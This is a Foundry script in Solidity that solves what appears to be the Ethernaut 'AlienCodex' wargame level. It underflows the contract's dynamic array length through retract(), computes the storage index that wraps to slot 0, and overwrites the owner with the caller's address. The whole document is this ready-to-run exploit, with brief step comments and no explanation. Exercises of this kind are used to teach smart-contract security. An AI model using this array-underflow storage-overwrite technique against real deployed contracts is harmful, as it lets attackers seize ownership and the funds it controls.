// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IAlienCodex {
    function contact() external view returns (bool);
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexSolution is Script {
    function run() external {
        uint deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address alienCodexAddress = 0xc66651C4AF7a329d9C2DA2EE82BDf055d9Cf24AF;

        vm.startBroadcast(deployerPrivateKey);

        IAlienCodex alien = IAlienCodex(alienCodexAddress);

        // Step 1: Make contact
        alien.makeContact();

        // Step 2: Trigger array underflow
        alien.retract();

        // Step 3: Compute index to overwrite owner
        uint256 arraySlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index = type(uint256).max - arraySlot + 1;

        // Step 4: Overwrite owner with our address
        bytes32 newOwner = bytes32(uint256(uint160(vm.addr(deployerPrivateKey))));
        alien.revise(index, newOwner);

        console.log("New owner:", alien.owner());

        vm.stopBroadcast();
    }
}
